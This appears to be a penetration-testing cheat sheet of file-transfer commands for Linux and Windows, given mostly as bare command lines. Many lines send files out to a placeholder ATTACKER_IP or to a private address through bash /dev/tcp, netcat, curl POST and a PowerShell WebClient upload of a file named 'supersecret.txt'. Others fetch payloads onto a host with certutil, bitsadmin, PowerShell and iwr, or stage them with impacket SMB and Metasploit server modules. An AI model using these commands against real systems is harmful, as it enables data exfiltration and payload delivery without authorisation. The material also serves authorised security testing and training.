

Linux :
```bash
# Upload
bash -c 'cat /path/to/file > /dev/tcp/ATTACKER_IP/PORT'

# Download
bash -c 'cat < /dev/tcp/ATTACKER_IP/PORT > file_saved'


# Upload
nc ATTACKER_IP PORT < /path/to/file

# Download
nc ATTACKER_IP PORT > file_saved

# Listen to receive
nc -lnvp PORT > received_file

# Listen to send
nc -lnvp PORT < /path/to/file



# Start HTTP server (Python 3)
python3 -m http.server 2121

# Start HTTP server (Python 2)
python -m SimpleHTTPServer 2121

# Download with wget
wget http://ATTACKER_IP:2121/filename

# Download with curl
curl http://ATTACKER_IP:2121/filename -o file_saved


# Upload
scp -P 2121 /path/to/file user@ATTACKER_IP:/destination/

# Download
scp -P 2121 user@ATTACKER_IP:/path/to/file file_saved


ftp ATTACKER_IP
put /path/to/file
get filename

# Upload
tftp ATTACKER_IP
put /path/to/file

# Download
tftp ATTACKER_IP
get filename


curl -X POST --data-binary @/path/to/file http://ATTACKER_IP:PORT/upload
```


Windows :
```bash
certutil -urlcache -f http://192.168.31.141/ignite.txt ignite.txt
bitsadmin /transfer job http://192.168.31.141/ignite.txt C:\Users\Public\ignite.txt

#Download file 
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')

#Upload file
powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')"

#copy files
impacket-smbserver share $(pwd) -smb2support
impacket-smbserver share $(pwd) -smb2support -username admin -password admin
net use \\192.168.154.138\share /user:admin admin 
		copy \\192.168.31.141\share\ignite.txt
		 copy ignite.txt \\192.168.31.141\share\ignite.txt



using tftp:
use auxiliary/server/tftp
set srvhost 192.168.31.141
set tftproot /root/raj
run
			tftp -i 192.168.31.219 GET ignite.txt


use auxiliary/server/ftp
set srvhost 192.168.31.141
set ftproot /root/raj
set ftpuser raj
set ftppass 123
run
				ftp 192.168.31.141
				dir
				get ignite.txt


python3 -m pyftpdlib -w -p 21 -u ignite -P 123
				ftp 192.168.31.141
				get ignite.txt
				put C:\Users\raj\avni.txt

iwr -uri http://<ip_address>/file.exe -outfile sh.exe
```